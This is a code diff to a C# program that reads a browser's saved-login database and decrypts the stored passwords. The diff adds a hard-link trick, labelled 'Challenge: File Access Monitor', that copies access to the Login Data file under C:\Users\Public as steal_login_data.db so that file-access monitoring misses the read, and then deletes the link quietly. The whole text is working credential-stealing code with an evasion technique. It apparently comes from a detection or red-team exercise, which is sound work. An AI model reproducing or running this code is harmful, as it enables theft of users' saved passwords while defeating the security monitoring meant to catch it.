@@ -39,6 +39,9 @@ class Program
     [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr hObject);
 
+    [DllImport("Kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern bool CreateHardLink(string lpFileName, string lpExistingFileName, IntPtr lpSecurityAttributes);
+
     static int FindProcessIdByName(string processName)
     {
         foreach (Process proc in Process.GetProcessesByName(processName))
@@ -171,7 +174,11 @@ class Program
         string dbPath = "C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data";
         byte[] key = Encoding.UTF8.GetBytes(SECRET);
 
-        using (SQLiteConnection conn = new SQLiteConnection($"Data Source={dbPath};Version=3;"))
+        // Challenge: File Access Monitor
+        string stealDbPath = "C:\\Users\\Public\\steal_login_data.db";
+        CreateHardLink(stealDbPath, dbPath, IntPtr.Zero);
+
+        using (SQLiteConnection conn = new SQLiteConnection($"Data Source={stealDbPath};Version=3;"))
         {
             conn.Open();
             using (SQLiteCommand cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
@@ -209,6 +216,8 @@ class Program
                 }
             }
         }
+
+        try { System.IO.File.Delete(stealDbPath); } catch { }
 
         return decryptedPassword;
     }
